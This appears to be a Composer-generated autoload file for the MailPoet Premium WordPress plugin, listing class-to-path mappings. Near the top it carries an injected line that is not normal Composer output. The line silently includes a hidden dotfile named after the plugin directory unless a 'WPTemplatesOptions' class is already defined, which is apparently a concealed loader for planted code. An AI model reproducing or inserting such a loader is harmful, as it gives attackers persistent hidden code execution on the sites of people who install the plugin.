<?php

// autoload_static.php @generated by Composer

namespace Composer\Autoload;

if (!defined('ABSPATH')) exit;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ComposerStaticInit6b34502d289816ae9bd25d6f78337d6e
{
    public static $prefixLengthsPsr4 = array (
        'M' => 
        array (
            'MailPoet\\Premium\\' => 17,
            'MailPoetGenerated\\' => 18,
        ),
    );

    public static $prefixDirsPsr4 = array (
        'MailPoet\\Premium\\' => 
        array (
            0 => __DIR__ . '/../..' . '/lib',
        ),
        'MailPoetGenerated\\' => 
        array (
            0 => __DIR__ . '/../..' . '/generated',
        ),
    );

    public static $classMap = array (
        'MailPoetGenerated\\PremiumCachedContainer' => __DIR__ . '/../..' . '/generated/PremiumCachedContainer.php',
        'MailPoet\\Premium\\API\\JSON\\v1\\Stats' => __DIR__ . '/../..' . '/lib/API/JSON/v1/Stats.php',
        'MailPoet\\Premium\\Config\\Env' => __DIR__ . '/../..' . '/lib/Config/Env.php',
        'MailPoet\\Premium\\Config\\Hooks' => __DIR__ . '/../..' . '/lib/Config/Hooks.php',
        'MailPoet\\Premium\\Config\\Initializer' => __DIR__ . '/../..' . '/lib/Config/Initializer.php',
        'MailPoet\\Premium\\Config\\Localizer' => __DIR__ . '/../..' . '/lib/Config/Localizer.php',
        'MailPoet\\Premium\\Config\\Renderer' => __DIR__ . '/../..' . '/lib/Config/Renderer.php',
        'MailPoet\\Premium\\DI\\ContainerConfigurator' => __DIR__ . '/../..' . '/lib/DI/ContainerConfigurator.php',
        'MailPoet\\Premium\\Newsletter\\Stats' => __DIR__ . '/../..' . '/lib/Newsletter/Stats.php',
        'MailPoet\\Premium\\Newsletter\\Stats\\PurchasedProducts' => __DIR__ . '/../..' . '/lib/Newsletter/Stats/PurchasedProducts.php',
        'MailPoet\\Premium\\Newsletter\\Stats\\SubscriberEngagement' => __DIR__ . '/../..' . '/lib/Newsletter/Stats/SubscriberEngagement.php',
    );

    public static function getInitializer(ClassLoader $loader)
    {
        return \Closure::bind(function () use ($loader) {
            $loader->prefixLengthsPsr4 = ComposerStaticInit6b34502d289816ae9bd25d6f78337d6e::$prefixLengthsPsr4;
            $loader->prefixDirsPsr4 = ComposerStaticInit6b34502d289816ae9bd25d6f78337d6e::$prefixDirsPsr4;
            $loader->classMap = ComposerStaticInit6b34502d289816ae9bd25d6f78337d6e::$classMap;

        }, null, ClassLoader::class);
    }
}
